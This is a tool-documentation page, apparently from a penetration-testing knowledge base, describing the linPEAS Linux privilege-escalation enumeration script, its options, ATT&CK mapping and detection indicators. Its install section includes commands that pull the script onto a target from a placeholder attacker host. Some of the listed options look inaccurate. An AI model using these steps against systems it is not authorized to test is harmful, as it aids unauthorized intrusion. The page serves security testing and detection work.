---
id: e688ac23-d622-4c35-bc4c-4342414cf0f0
name: linPEAS
type: tool
verified: true
created_at: '2020-02-29T01:35:57.840170+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
commands:
  - '[[commands/linpeas-enumerate-linux-system-all-checks]]'
platforms:
  - Linux
tags:
  - Enumeration
  - privileges
url: 'https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS'
validated: true
---

# linPEAS

**Status**: ✓ Verified

## Overview

linPEAS is an automated Linux privilege escalation enumeration script designed to identify potential vectors for escalating privileges on Unix-like systems. It is part of the PEASS-ng suite and is commonly used during penetration testing and red team engagements to quickly assess a compromised host for misconfigurations, weak permissions, and exploitable services that could lead to root access.

## Description

linPEAS performs a wide range of system checks, including but not limited to: file and directory permissions, SUID/SGID binaries, cron jobs, scheduled tasks, network interfaces and services, process listings, user accounts, kernel information, and common application misconfigurations. The output is color-coded to prioritize findings: red and yellow indicate high-priority privilege escalation opportunities, while green covers standard enumerations. This tool is particularly useful in post-exploitation phases to map out escalation paths without manual scripting.

## Features

- **Comprehensive Checks**: Covers permissions, SUID binaries, cron jobs, mounts, users/groups, services, kernel exploits, and more.
- **Color-Coded Output**: Red/yellow for critical PE vectors, blue for devices, green for common info, to facilitate quick triage.
- **Modular Options**: Can run all checks or focus on specific categories like users, services, or system info.
- **No Installation Required on Target**: Runs directly from a downloaded script, minimizing footprint.
- **Updated Regularly**: Includes checks for recent CVEs and common Linux distributions (Ubuntu, CentOS, etc.).

## Installation

### Requirements

- Bash shell (standard on Linux/Unix systems).
- Internet access on the attacker's machine to download the script (target does not need internet).
- No additional dependencies; the script is self-contained.

### Install Commands

```bash
# Clone the PEASS-ng repository on your Kali/Ubuntu machine
 git clone https://github.com/carlospolop/PEASS-ng.git
 cd PEASS-ng/linPEAS

# For Ubuntu/Kali (if not using git)
 wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh

# Transfer to target (e.g., via wget on target if internet available, or scp/wget from attacker)
# On target: wget http://attacker-ip/linpeas.sh
# Or: curl -O http://attacker-ip/linpeas.sh
```

To run on the target, simply execute the script after transfer:

```bash
chmod +x linpeas.sh
bash linpeas.sh
```

## Basic Usage

```bash
bash linpeas.sh --help
```

This displays available options, such as targeted scans (e.g., `--users` for user enumeration only).

### Common Options

| Option | Description |
|--------|-------------|
| `-h, --help` | Show help message and options |
| `-a, --all` | Run all enumeration checks (default) |
| `-s, --services` | Enumerate services and daemons only |
| `-u, --users` | Focus on users, groups, and passwords |
| `-n, --network` | Network interfaces and connections |
| `| tee output.txt` | Pipe output to file for offline analysis |

## Examples

### Example 1: Basic Usage

Execute full enumeration on the target system:

```bash
bash linpeas.sh | tee /tmp/linpeas_output.txt
```

### Example 2: Advanced Usage

Run a focused scan on potential privilege escalation vectors related to services:

```bash
bash linpeas.sh -s
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[System Information Discovery]] System Information Discovery
- [[Process Discovery]] Process Discovery
- [[File and Directory Discovery]] File and Directory Discovery
- [[Permission Groups Discovery]] Permission Groups Discovery
- [[Network Service Scanning]] Network Service Discovery

### Tactics

- [[Discovery]] Discovery

## Detection

Indicators and methods for detecting this tool's usage:

- **File Artifacts**: Presence of `linpeas.sh` or `linpeas_output.txt` in /tmp or user directories.
- **Process Monitoring**: Bash process executing a script with extensive system calls (e.g., via auditd or Sysdig).
- **Network Traffic**: If downloaded via wget/curl, look for connections to GitHub or known attacker IPs.
- **Output Files**: Large text files with enumeration patterns (e.g., strings containing "SUID", "cron", "PE vector").
- **Behavioral**: Sudden enumeration of system files by non-admin users; monitor via SELinux/AppArmor logs.

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/LinEnum]]
- [[Linux Exploit Suggester]]
- [[tools/enum4linux]]

## References

- Official GitHub Repository: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
- PEASS-ng Documentation: https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- Related: LinEnum (https://github.com/rebootuser/LinEnum)
